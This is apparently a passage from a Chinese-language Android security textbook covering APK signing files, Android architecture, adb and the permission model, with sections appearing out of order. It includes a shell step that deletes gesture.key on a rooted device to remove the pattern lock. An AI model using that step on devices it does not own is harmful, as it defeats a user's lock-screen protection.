Archive\uff09\u6709\u5f88 \u591a\u5171\u540c\u70b9\uff0c\u5b83\u7528\u4e8e\u5c06\u4ee3\u7801\uff0c\u8d44\u6e90\u548c\u5143\u6570\u636e\uff08\u6765\u81ea\u53ef\u9009\u7684 META-INF \u76ee\u5f55 \uff09\u6587\u4ef6\u4f7f\u7528 zip \u5f52\u6863\u7b97 \u6cd5\u8f6c\u6362\u6210\u4e00\u4e2a\u6587\u4ef6\u3002 META-INF \u76ee\u5f55\u5b58\u50a8\u8f6f\u4ef6\u5305\u548c\u6269\u5c55\u914d\u7f6e\u6570\u636e\uff0c\u5305\u62ec\u5b89\u5168\u6027\uff0c\u7248\u672c\u63a7\u5236\uff0c\u6269 \u5c55\u548c\u670d\u52a1[5]\u3002 \u57fa\u672c\u4e0a\uff0c\u5728 Android \u7684\u60c5\u51b5\u4e2d\uff0c apkbuilder \u5de5\u5177\u5c06\u6784\u5efa\u7684\u9879\u76ee\u6587\u4ef6\u538b\u7f29\u5230\u4e00\u8d77 [1]\uff0c\u4f7f\u7528\u6807\u51c6\u7684 Java \u5de5\u5177 jarsigner \u5bf9\u8fd9\u4e2a\u5f52\u6863\u6587\u4ef6\u7b7e\u540d[6]\u3002 \u5728\u5e94\u7528\u7a0b\u5e8f\u7b7e\u540d\u8fc7\u7a0b \u4e2d\uff0c jarsigner \u521b\u5efa META-INF \u76ee\u5f55\uff0c\u5728 Android \u4e2d\u901a\u5e38\u5305\u542b\u4ee5\u4e0b\u6587\u4ef6\uff1a\u6e05\u5355\u6587\u4ef6 \uff08 MANIFEST.MF \uff09\uff0c\u7b7e\u540d\u6587\u4ef6\uff08\u6269\u5c55\u540d\u4e3a .SF \uff09\u548c\u7b7e\u540d\u5757\u6587\u4ef6\uff08 .RSA \u6216 .DSA \uff09 \u3002 \u6e05\u5355\u6587\u4ef6\uff08 MANIFEST.MF \uff09\u7531\u4e3b\u5c5e\u6027\u90e8\u5206\u548c\u6bcf\u4e2a\u6761\u76ee\u5c5e\u6027\u7ec4\u6210\uff0c\u6bcf\u4e2a\u5305\u542b\u5728\u672a\u7b7e\u540d\u7684 apk \u4e2d \u6587\u4ef6\u62e5\u6709\u4e00\u4e2a\u6761\u76ee\u3002 \u8fd9\u4e9b\u6bcf\u4e2a\u6761\u76ee\u4e2d\u7684\u5c5e\u6027\u5b58\u50a8\u6587\u4ef6\u540d\u79f0\u4fe1\u606f\uff0c\u4ee5\u53ca\u4f7f\u7528 base64 \u683c\u5f0f\u7f16\u7801 \u7684\u6587\u4ef6\u5185\u5bb9\u6458\u8981\u3002 \u5728 Android \u4e0a\uff0cSHA1 \u7b97\u6cd5\u7528\u4e8e\u8ba1\u7b97\u6458\u8981\u3002 \u6e05\u5355 6.1 \u4e2d\u63d0\u4f9b\u4e86\u6e05\u5355\u6587\u4ef6\u7684 \u6458\u5f55\u3002 1 Manifest\u2212Version : 1.0 2 Created\u2212By: 1.6.0 41 (Sun Microsystems Inc. ) 3 4 Name: res/layout/main . xml 5 SHA1\u2212Digest : NJ1YLN3mBEKTPibVXbFO8eRCAr8= 6 7 Name: AndroidManifest . xml 8 SHA1\u2212Digest : wBoSXxhOQ2LR/pJY7Bczu1sWLy4= \u4ee3\u7801 6.1\uff1a\u6e05\u5355\u6587\u4ef6\u7684\u6458\u5f55 \u5305\u542b\u88ab\u7b7e\u540d\u6570\u636e\u7684\u7b7e\u540d\u6587\u4ef6\uff08 .SF \uff09\u7684\u5185\u5bb9\u7c7b\u4f3c\u4e8e MANIFEST.MF \u7684\u5185\u5bb9\u3002 \u8fd9\u4e2a\u6587\u4ef6\u7684\u4e00\u4e2a\u4f8b \u5b50\u5982\u6e05\u5355 6.2 \u6240\u793a\u3002 \u4e3b\u8981\u90e8\u5206\u5305\u542b\u6e05\u5355\u6587\u4ef6\u7684\u4e3b\u8981\u5c5e\u6027\u7684\u6458\u8981 \uff08 SHA1-Digest-Manifest-Main-Attributes \uff09\u548c\u5185\u5bb9\u6458\u8981\uff08 SHA1-Digest-Manifest \uff09\u3002 \u6bcf\u4e2a\u6761 \u76ee\u5305\u542b\u6e05\u5355\u6587\u4ef6\u4e2d\u7684\u6761\u76ee\u7684\u6458\u8981\u4ee5\u53ca\u76f8\u5e94\u7684\u6587\u4ef6\u540d \u6700\u540e\u4e00\u90e8\u5206\u662f\u7b7e\u540d\u5757\u6587\u4ef6\uff08 .DSA \u6216 .RSA \uff09\u3002 \u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u5305\u542b\u7b7e\u540d\u6587\u4ef6\u7684\u7b7e\u540d\u7248\u672c; \u5b83 \u4e0e\u76f8\u5e94\u7684 .SF \u6587\u4ef6\u5177\u6709\u76f8\u540c\u7684\u540d\u79f0\u3002 \u6839\u636e\u6240\u4f7f\u7528\u7684\u7b97\u6cd5\uff08RSA \u6216 DSA\uff09\uff0c\u5b83\u6709\u4e0d\u540c\u7684\u6269\u5c55 \u540d\u3002 \u76f8\u540c\u7684apk\u6587\u4ef6\u6709\u53ef\u80fd\u7b7e\u7f72\u51e0\u4e2a\u4e0d\u540c\u7684\u8bc1\u4e66\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5728 META-INF \u76ee\u5f55\u4e2d\u5c06\u6709\u51e0 \u4e2a .SF \u548c .DSA \u6216 .RSA \u6587\u4ef6\uff08\u5b83\u4eec\u7684\u6570\u91cf\u5c06\u7b49\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7b7e\u540d\u7684\u6b21\u6570\uff09\u3002 6.1.1 Android \u4e2d\u7684\u5e94\u7528\u7b7e\u540d\u68c0\u67e5 \u00b6 \u5927\u591a\u6570 Android \u5e94\u7528\u7a0b\u5e8f\u90fd\u4f7f\u7528\u5f00\u53d1\u4eba\u5458\u7b7e\u540d\u7684\u8bc1\u4e66\uff08\u6ce8\u610f Android \u7684\u201c\u8bc1\u4e66\u201d\u548c\u201c\u7b7e\u540d\u201d\u53ef\u4ee5\u4e92 \u6362\u4f7f\u7528\uff09\u3002 \u6b64\u8bc1\u4e66\u7528\u4e8e\u786e\u4fdd\u539f\u59cb\u5e94\u7528\u7a0b\u5e8f\u7684\u4ee3\u7801\u53ca\u5176\u66f4\u65b0\u6765\u81ea\u540c\u4e00\u4f4d\u7f6e\uff0c\u5e76\u5728\u540c\u4e00\u5f00\u53d1\u4eba\u5458 \u7684\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb\u3002 \u4e3a\u4e86\u6267\u884c\u8fd9\u4e2a\u68c0\u67e5\uff0cAndroid \u53ea\u662f\u6bd4\u8f83\u8bc1\u4e66\u7684\u4e8c\u8fdb\u5236\u8868\u793a\uff0c \u5b83\u7528\u4e8e\u7b7e\u7f72\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u53ca\u5176\u66f4\u65b0\uff08\u7b2c\u4e00\u79cd\u60c5\u51b5\uff09\u548c\u534f\u4f5c\u5e94\u7528\u7a0b\u5e8f\uff08\u7b2c\u4e8c\u79cd\u60c5\u51b5\uff09\u3002 \u8fd9\u79cd\u5bf9\u8bc1\u4e66\u7684\u68c0\u67e5\u901a\u8fc7 PackageManagerService \u4e2d\u7684\u65b9 \u6cd5 int compareSignatures(Signature[] s1\uff0cSignature[] s2) \u6765\u5b9e\u73b0\uff0c\u4ee3\u7801\u5982\u6e05\u5355 6.3 \u6240\u793a\u3002\u5728 \u4e0a\u4e00\u8282\u4e2d\uff0c\u6211\u4eec\u6ce8\u610f\u5230\u5728 Android \u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2a\u4e0d\u540c\u7684\u8bc1\u4e66\u7b7e\u7f72\u76f8\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u8fd9\u89e3 \u91ca\u4e86\u4e3a\u4ec0\u4e48\u8be5\u65b9\u6cd5\u4f7f\u7528\u4e24\u4e2a\u7b7e\u540d\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\u3002\u5c3d\u7ba1\u8be5\u65b9\u6cd5\u5728 Android \u5b89\u5168\u89c4\u5b9a\u4e2d\u5360\u6709\u91cd\u8981 \u5730\u4f4d\uff0c\u4f46\u5176\u884c\u4e3a\u5f3a\u70c8\u4f9d\u8d56\u4e8e\u5e73\u53f0\u7684\u7248\u672c\u3002\u5728\u8f83\u65b0\u7248\u672c\u4e2d\uff08\u4ece Android 2.2 \u5f00\u59cb\uff09\uff0c\u6b64\u65b9\u6cd5\u6bd4\u8f83 \u4e24\u4e2a Signature \u6570\u7ec4\uff0c\u5982\u679c\u4e24\u4e2a\u6570\u7ec4\u4e0d\u7b49\u4e8e null \uff0c\u5e76\u4e14\u5982\u679c\u6240\u6709 s2 \u7b7e\u540d\u90fd\u5305\u542b\u5728 s1 \u4e2d\uff0c \u5219\u8fd4\u56de SIGNATURE MATCH \u503c\uff0c\u5426\u5219\u4e3a SIGNATURE_NOT_MATCH \u3002\u5728\u7248\u672c 2.2 \u4e4b\u524d\uff0c\u6b64\u65b9\u6cd5\u68c0\u67e5\u6570 \u7ec4 s1 \u662f\u5426\u5305\u542b\u5728 s2 \u4e2d\u3002\u8fd9\u79cd\u884c\u4e3a\u5141\u8bb8\u7cfb\u7edf\u5b89\u88c5\u5347\u7ea7\uff0c\u5373\u4f7f\u5b83\u4eec\u5df2\u7ecf\u4f7f\u7528\u539f\u59cb\u5e94\u7528\u7a0b\u5e8f\u7684\u8bc1 \u4e66\u5b50\u96c6\u7b7e\u540d[2]\u3002 \u5728\u51e0\u79cd\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u540c\u4e00\u5f00\u53d1\u4eba\u5458\u7684\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u7684\u4fe1\u4efb\u5173\u7cfb\u3002 \u7b2c\u4e00\u79cd\u60c5\u51b5 \u4e0e signature \u548c signatureOrSystem \u7684\u6743\u9650\u76f8\u5173\u3002 \u8981\u4f7f\u7528\u53d7\u8fd9\u4e9b\u6743\u9650\u4fdd\u62a4\u7684\u529f\u80fd\uff0c\u58f0\u660e\u6743\u9650\u548c \u8bf7\u6c42\u5b83\u7684\u5305\u5fc5\u987b\u4f7f\u7528\u540c\u4e00\u7ec4\u8bc1\u4e66\u7b7e\u540d\u3002 \u7b2c\u4e8c\u79cd\u60c5\u51b5\u4e0e Android \u8fd0\u884c\u5177\u6709\u76f8\u540c UID \u6216\u751a\u81f3\u5728\u76f8 \u540c Linux \u8fdb\u7a0b\u4e2d\u8fd0\u884c\u4e0d\u540c\u5e94\u7528\u7a0b\u5e8f\u7684\u80fd\u529b\u6709\u5173\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8bf7\u6c42\u6b64\u7c7b\u884c\u4e3a\u7684\u5e94\u7528\u7a0b\u5e8f\u5fc5 \u987b\u4f7f\u7528\u76f8\u540c\u7684\u7b7e\u540d\u8fdb\u884c\u7b7e\u540d\u3002 \u7b2c\u4e00\u7ae0 Android \u5b89\u5168\u5165\u95e8 \u00b6 1.1 Android \u7b80\u4ecb \u00b6 \u5728 Linux \u5185\u6838\u4e4b\u4e0a\u662f\u4e00\u4e2a\u5c42\u7ea7\uff0c\u5305\u542b\u4e00\u4e9b\u6700\u91cd\u8981\u548c\u6709\u7528\u7684\u5e93\uff0c\u5982\u4e0b\u6240\u793a\uff1a Surface Manager\uff1a\u7ba1\u7406\u7a97\u53e3\u548c\u5c4f\u5e55 \u5a92\u4f53\u6846\u67b6\uff1a\u8fd9\u5141\u8bb8\u4f7f\u7528\u5404\u79cd\u7c7b\u578b\u7684\u7f16\u89e3\u7801\u5668\u6765\u64ad\u653e\u548c\u8bb0 \u5f55\u4e0d\u540c\u7684\u5a92\u4f53 SQLite\uff1a\u8fd9\u662f\u4e00\u4e2a\u8f83\u8f7b\u7684 SQL \u7248\u672c\uff0c\u7528\u4e8e\u6570\u636e\u5e93\u7ba1\u7406 WebKit\uff1a\u8fd9\u662f\u6d4f\u89c8\u5668\u6e32 \u67d3\u5f15\u64ce OpenGL\uff1a\u7528\u4e8e\u5728\u5c4f\u5e55\u4e0a\u6b63\u786e\u663e\u793a 2D \u548c 3D \u5185\u5bb9 Android \u4e2d\u7684\u5e93\u662f\u7528 C \u548c C++ \u7f16\u5199\u7684\uff0c\u5176\u4e2d\u5927\u591a\u6570\u662f\u4ece Linux \u79fb\u690d\u7684\u3002 \u4e0e Linux \u76f8\u6bd4\uff0c Android \u4e2d\u7684\u4e00\u4e2a\u4e3b\u8981\u533a\u522b\u662f\uff0c\u5728\u8fd9\u91cc\u6ca1\u6709 libc \u5e93\uff0c\u5b83\u7528\u4e8e Linux \u4e2d\u7684\u5927\u591a\u6570\u4efb\u52a1\u3002 \u76f8\u53cd\uff0c Android \u6709\u81ea\u5df1\u7684\u79f0\u4e3a bionic \u7684\u5e93\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u5b83\u662f\u4e00\u4e2a\u5265\u79bb\u548c\u4fee\u6539\u540e\u7684\uff0c\u7528\u4e8e Android \u7684 libc \u7248\u672c\u3002 \u5728\u540c\u4e00\u5c42\u7ea7\uff0c\u8fd8\u6709\u6765\u81ea Android \u8fd0\u884c\u65f6 -- Dalvik \u865a\u62df\u673a\u548c\u6838\u5fc3\u5e93\u7684\u7ec4\u4ef6\u3002 \u6211\u4eec\u5c06\u5728\u672c\u4e66\u7684\u4e0b \u4e00\u90e8\u5206\u4e2d\u8ba8\u8bba\u5173\u4e8e Dalvik \u865a\u62df\u673a\u7684\u5f88\u591a\u5185\u5bb9\u3002 \u5728\u8fd9\u4e2a\u5c42\u4e4b\u4e0a\uff0c\u6709\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5c42\uff0c\u5b83\u652f\u6301\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u4e0d\u540c\u7c7b\u578b\u7684\u4efb\u52a1\u3002 \u6b64\u5916\uff0c\u5f00\u53d1\u4eba\u5458\u521b\u5efa\u7684\u5927\u591a\u6570\u5e94\u7528\u7a0b\u5e8f\u53ea\u4e0e\u7b2c\u4e00\u5c42\u548c\u6700\u9876\u5c42\u7684\u5e94\u7528\u7a0b\u5e8f\u4ea4\u4e92\u3002 \u8be5\u67b6\u6784\u4ee5\u4e00\u79cd \u65b9\u5f0f\u8bbe\u8ba1\uff0c\u5728\u6bcf\u4e2a\u65f6\u95f4\u70b9\uff0c\u5e95\u5c42\u90fd\u652f\u6301\u4e0a\u9762\u7684\u5c42\u7ea7\u3002 Android \u4e2d\u7684\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u90fd\u5728\u865a\u62df\u73af\u5883\u4e0b\u8fd0\u884c\uff0c\u8fd9\u79f0\u4e3a Dalvik \u865a\u62df\u673a\uff08DVM\uff09\u3002 \u8fd9\u91cc\u9700\u8981 \u6ce8\u610f\u7684\u4e00\u70b9\u662f\uff0c\u4ece Android 4.4 \u7248\u672c\u5f00\u59cb\uff0c\u8fd8\u6709\u53e6\u4e00\u4e2a\u8fd0\u884c\u65f6\u79f0\u4e3a Android \u8fd0\u884c\u65f6\uff08ART\uff09\uff0c \u7528\u6237\u53ef\u4ee5\u5728 DVM \u548c ART \u8fd0\u884c\u65f6\u73af\u5883\u4e4b\u95f4\u81ea\u7531\u5207\u6362\u3002 \u7136\u800c\uff0c\u5bf9\u4e8e\u8fd9\u672c\u4e66\uff0c\u6211\u4eec\u5c06\u53ea\u5173\u6ce8 Dalvik \u865a\u62df\u673a\u5b9e\u73b0\u3002 \u5b83\u7c7b\u4f3c\u4e8e Java \u865a\u62df\u673a\uff08JVM\uff09\uff0c\u9664 \u4e86\u57fa\u4e8e\u5bc4\u5b58\u5668\u7684\u7279\u6027\uff0c\u800c\u4e0d\u662f\u57fa\u4e8e\u5806\u6808\u7684\u7279\u6027\u3002 \u56e0\u6b64\uff0c\u8fd0\u884c\u7684\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u5c06\u5728\u81ea\u5df1\u7684 Dalvik \u865a\u62df\u673a\u5b9e\u4f8b\u4e0b\u8fd0\u884c\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u6211\u4eec\u8fd0\u884c\u4e09\u4e2a\u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5c06\u6709\u4e09\u4e2a\u4e0d\u540c\u7684\u865a\u62df \u5b9e\u4f8b\u3002 \u73b0\u5728\uff0c\u8fd9\u91cc\u7684\u91cd\u70b9\u662f\uff0c\u5373\u4f7f\u5b83\u4e3a\u5e94\u7528\u7a0b\u5e8f\u521b\u5efa\u4e00\u4e2a\u865a\u62df\u73af\u5883\u6765\u8fd0\u884c\uff0c\u5b83\u4e0d\u5e94\u8be5\u4e0e\u5b89\u5168 \u5bb9\u5668\u6216\u5b89\u5168\u73af\u5883\u6df7\u6dc6\u3002 DVM \u7684\u4e3b\u8981\u7126\u70b9\u662f\u4e0e\u6027\u80fd\u76f8\u5173\uff0c\u800c\u4e0d\u662f\u4e0e\u5b89\u5168\u6027\u76f8\u5173\u3002 Dalvik \u865a\u62df\u673a\u6267\u884c\u4e00\u4e2a\u540d\u4e3a .dex \u6216 Dalvik \u53ef\u6267\u884c\u6587\u4ef6\u7684\u6587\u4ef6\u683c\u5f0f\u3002 1.2 \u6df1\u5165\u4e86\u89e3 Android \u00b6 \u5982\u679c\u4f60\u6709 Android \u8bbe\u5907\u6216\u6b63\u5728\u8fd0\u884cAndroid\u6a21\u62df\u5668\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528 Android SDK \u672c\u8eab\u63d0\u4f9b\u7684\u5de5\u5177 \uff08\u79f0\u4e3a adb\uff09\u3002 \u6211\u4eec\u5c06\u5728\u7b2c\u4e8c\u7ae0\u8be6\u7ec6\u8ba8\u8bba adb\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u5c06\u53ea\u8bbe\u7f6e SDK\uff0c\u6211\u4eec\u5df2\u7ecf\u51c6\u5907\u597d \u4e86\u3002 \u4e00\u65e6\u8bbe\u5907\u901a\u8fc7 USB \u8fde\u63a5\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u6211\u4eec\u7684\u7ec8\u7aef\u4e2d\u8f93\u5165 adb\uff0c\u8fd9\u5c06\u663e\u793a\u6240\u8fde\u63a5\u8bbe\u5907\u7684\u5e8f\u5217\u53f7 \u5217\u8868\u3002 \u8bf7\u786e\u4fdd\u4f60\u5df2\u5728\u8bbe\u5907\u8bbe\u7f6e\u4e2d\u542f\u7528\u4e86 USB \u8c03\u8bd5\u529f\u80fd\u3002 $ adb devices List of devices attached emulator-5554 device \uff0cAndroid \u662f\u57fa\u4e8e Linux \u5185\u6838\u7684\uff0c\u6240\u4ee5\u5927\u591a\u6570 Linux \u547d\u4ee4\u5728 Android \u4e0a \u4e5f\u53ef\u4ee5\u901a\u8fc7 adb shell \u5b8c\u7f8e\u8fd0\u884c\u3002 adb shell \u4e3a\u4f60\u63d0\u4f9b\u4e0e\u8bbe\u5907\u7684 shell \u76f4\u63a5\u4ea4\u4e92\uff0c\u4f60\u53ef\u4ee5\u5728\u5176\u4e2d \u6267\u884c\u547d\u4ee4\u548c\u6267\u884c\u64cd\u4f5c\u4ee5\u53ca\u5206\u6790\u8bbe\u5907\u4e2d\u5b58\u5728\u7684\u4fe1\u606f\u3002 \u4e3a\u4e86\u6267\u884c shell\uff0c\u53ea\u9700\u8981\u952e\u5165\u4ee5\u4e0b\u547d\u4ee4\uff1a adb shell. Android \u5b89\u5168\u6a21\u578b\u7684\u6838\u5fc3\u662f Linux \u7279\u6743\u5206\u79bb\u3002 \u6bcf\u6b21\u5728 Android \u8bbe\u5907\u4e2d\u542f\u52a8\u65b0\u5e94\u7528\u7a0b\u5e8f \u65f6\uff0c\u90fd\u4f1a\u4e3a\u5176\u5206\u914d\u552f\u4e00\u7684\u7528\u6237 ID\uff08UID\uff09\uff0c\u8be5\u7528\u6237 ID \u5c06\u4e4b\u540e\u4f1a\u5c5e\u4e8e\u67d0\u4e9b\u5176\u4ed6\u9884\u5b9a\u4e49\u7ec4\u3002 \u4e0e Linux \u7c7b\u4f3c\uff0c\u7528\u4f5c\u547d\u4ee4\u7684\u6240\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\u90fd\u4f4d\u4e8e /system/bin \u548c /system /xbin \u3002 \u6b64\u5916\uff0c\u6211 \u4eec\u4ece Play \u5546\u5e97\u6216\u4efb\u4f55\u5176\u4ed6\u6765\u6e90\u5b89\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u5c06\u4f4d\u4e8e /data/data \uff0c\u800c\u5176\u539f\u59cb\u5b89\u88c5\u6587\u4ef6 \uff08\u5373 .apk \uff09\u5c06\u5b58\u50a8\u5728 /data/app \u3002 \u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u4ece Play \u5546\u5e97\u8d2d\u4e70\uff0c\u800c\u4e0d\u662f \u53ea\u662f\u514d\u8d39\u4e0b\u8f7d\u3002 \u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u5c06\u5b58\u50a8\u5728 /data/app-private/ \u3002 Android \u5b89\u88c5\u5305\uff08APK\uff09\u662f Android \u5e94\u7528\u7a0b\u5e8f\u7684\u9ed8\u8ba4\u6269\u5c55\u540d\uff0c\u5b83\u53ea\u662f\u4e00\u4e2a\u5f52\u6863\u6587\u4ef6\uff0c\u5305\u542b\u5e94\u7528 \u7a0b\u5e8f\u7684\u6240\u6709\u5fc5\u9700\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u3002 \u6211\u4eec\u5728\u540e\u9762\u7684\u7ae0\u8282\u4e2d\u5c06\u7ee7\u7eed\u5bf9 .apk \u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5de5\u7a0b\u3002 \u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u8bbf\u95ee /data/data \uff0c\u770b\u770b\u91cc\u9762\u6709\u4ec0\u4e48\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u662f\uff0c\u4e3a\u4e86\u5728\u771f\u5b9e\u8bbe\u5907 \u4e0a\u5b9e\u73b0\uff0c\u8bbe\u5907\u9700\u8981 root \u5e76\u4e14\u5fc5\u987b\u5904\u4e8e su \u6a21\u5f0f\uff1a \u5982\u679c\u624b\u673a\u5df2\u7ecf root\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u4efb\u4f55\u6587 \u4ef6\u3002 \u5bf9\u8bbe\u5907\u83b7\u53d6 root \u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u5b8c\u5168\u8bbf\u95ee\u548c\u63a7\u5236\u6574\u4e2a\u8bbe\u5907\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4ee5\u53ca \u4fee\u6539\u4efb\u4f55\u6211\u4eec\u60f3\u8981\u7684\u6587\u4ef6\u3002 \u6700\u5e38\u89c1\u7684\u5b89\u5168\u4fdd\u62a4\u4e4b\u4e00\u662f\u5927\u591a\u6570\u4eba\u90fd\u60f3\u5230\u7684\u662f\u6a21\u5f0f\u9501\u5b9a\u6216 pin \u9501\uff0c\u5b83\u9ed8\u8ba4\u5b58\u5728\u4e8e\u6240\u6709Android \u624b\u673a\u3002 \u4f60\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee Settings | Security | Screen Lock \u6765\u914d\u7f6e\u81ea\u5df1\u7684\u6a21\u5f0f\u3002 \u4e00\u65e6\u6211\u4eec\u8bbe\u7f6e\u4e86\u5bc6\u7801\u6216\u6a21\u5f0f\u9501\u5b9a\uff0c\u6211\u4eec\u73b0\u5728\u5c06\u7ee7\u7eed\uff0c\u5c06\u624b\u673a\u4e0e USB \u8fde\u63a5\u5230\u6211\u4eec\u7684\u7cfb\u7edf\u3002 \u73b0 \u5728\uff0c\u5bc6\u7801\u9501\u7684\u5bc6\u94a5\u6216\u6a21\u5f0f\u9501\u7684\u6a21\u5f0f\u6570\u636e\u4ee5\u540d\u79f0 password.key \u6216 gesture.key \u5b58\u50a8 \u5728 /data/system \u3002 \u6ce8\u610f\uff0c\u5982\u679c\u8bbe\u5907\u88ab\u9501\u5b9a\uff0c\u5e76\u4e14 USB \u8c03\u8bd5\u88ab\u6253\u5f00\uff0c\u4f60\u9700\u8981\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5f15\u5bfc \u52a0\u8f7d\u7a0b\u5e8f\u6765\u6253\u5f00 USB \u8c03\u8bd5\u3002 \u6574\u4e2a\u8fc7\u7a0b\u8d85\u51fa\u4e86\u672c\u4e66\u7684\u8303\u56f4\u3002 \u8981\u4e86\u89e3\u6709\u5173 Android \u7684\u66f4\u591a\u4fe1 \u606f\uff0c\u8bf7\u53c2\u9605 Thomas Cannon Digging \u7684 Defcon \u6f14\u793a\u3002 \u56e0\u4e3a\u7834\u89e3\u5bc6\u7801/\u6a21\u5f0f\u5c06\u66f4\u52a0\u8270\u96be\uff0c\u5e76\u4e14\u9700\u8981\u66b4\u529b\uff08\u6211\u4eec\u5c06\u770b\u5230\u5982\u4f55\u89e3\u5bc6\u5b9e\u9645\u6570\u636e\uff09\uff0c\u6211\u4eec\u5c06\u7b80 \u5355\u5730\u7ee7\u7eed\u5e76\u5220\u9664\u8be5\u6587\u4ef6\uff0c\u8fd9\u5c06\u4ece\u6211\u4eec\u624b\u673a\u4e2d\u5220\u9664\u6a21\u5f0f\u4fdd\u62a4 \uff1a shell@android:/data # cd /data/system shell@android:/data/system # rm gesture.key 1.3 \u6c99\u7bb1\u548c\u6743\u9650\u6a21\u578b \u00b6 Android \u4e2d\u7684\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u5728\u5176\u81ea\u5df1\u7684 Dalvik \u865a\u62df\u673a\u5b9e\u4f8b\u4e2d \u8fd0\u884c\u3002 \u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\uff0c\u65e0\u8bba\u4f55\u65f6\u4efb\u4f55\u5e94\u7528\u7a0b\u5e8f\u5728\u6211\u4eec\u7684\u8bbe\u5907\u4e2d\u5d29\u6e83\uff0c\u5b83\u53ea\u662f\u663e\u793a\u5f3a\u5236\u5173\u95ed\u6216 \u7b49\u5f85\u9009\u9879\uff0c\u4f46\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u7ee7\u7eed\u987a\u5229\u8fd0\u884c\u3002 \u6b64\u5916\uff0c\u7531\u4e8e\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u5728\u5176\u81ea\u5df1\u7684\u5b9e\u4f8b\u4e2d\u8fd0 \u884c\uff0c\u56e0\u6b64\u9664\u975e\u5185\u5bb9\u63d0\u4f9b\u8005\u53e6\u6709\u89c4\u5b9a\uff0c\u5426\u5219\u5c06\u65e0\u6cd5\u8bbf\u95ee\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\u3002 Android \u4f7f\u7528\u7ec6\u7c92\u5ea6\u7684\u6743\u9650\u6a21\u578b\uff0c\u8fd9\u9700\u8981\u5e94\u7528\u7a0b\u5e8f\u5728\u7f16\u8bd1\u6700\u7ec8\u5e94\u7528\u7a0b\u5e8f\u5305\u4e4b\u524d\u9884\u5b9a\u4e49\u6743\u9650\u3002 \u4f60\u5fc5\u987b\u6ce8\u610f\u5230\uff0c\u6bcf\u6b21\u4ece Play \u5546\u5e97\u6216\u4efb\u4f55\u5176\u4ed6\u6765\u6e90\u4e0b\u8f7d\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u5b83\u4f1a\u5728\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u663e\u793a\u4e00 \u4e2a\u6743\u9650\u5c4f\u5e55\uff0c\u5b83\u7c7b\u4f3c\u4e8e\u4ee5\u4e0b\u5c4f\u5e55\u622a\u56fe\uff1a \u6b64\u6743\u9650\u5c4f\u5e55\u663e\u793a\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7\u624b\u673a\u6267\u884c\u7684\u6240\u6709\u4efb\u52a1\u7684\u5217\u8868\uff0c\u4f8b\u5982\u53d1\u9001\u77ed\u4fe1\uff0c\u8bbf\u95ee\u4e92\u8054\u7f51 \u548c\u8bbf\u95ee\u6444\u50cf\u5934\u3002 \u8bf7\u6c42\u591a\u4e8e\u6240\u9700\u7684\u6743\u9650\u4f7f\u5e94\u7528\u7a0b\u5e8f\u6210\u4e3a\u6076\u610f\u8f6f\u4ef6\u4f5c\u8005\u7684\u66f4\u5177\u5438\u5f15\u529b\u7684\u76ee\u6807\u3002 Android \u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u5fc5\u987b\u5728\u5f00\u53d1\u5e94\u7528\u7a0b\u5e8f\u65f6\u5728\u540d\u4e3a AndroidManifest.xml \u7684\u6587\u4ef6\u4e2d\u6307\u5b9a \u6240\u6709\u8fd9\u4e9b\u6743\u9650\u3002 \u6b64\u6587\u4ef6\u5305\u542b\u5404\u79cd\u5e94\u7528\u7a0b\u5e8f\u76f8\u5173\u4fe1\u606f\u7684\u5217\u8868\uff0c\u4f8b\u5982\u8fd0\u884c\u7a0b\u5e8f\u6240\u9700\u7684\u6700\u4f4e Android 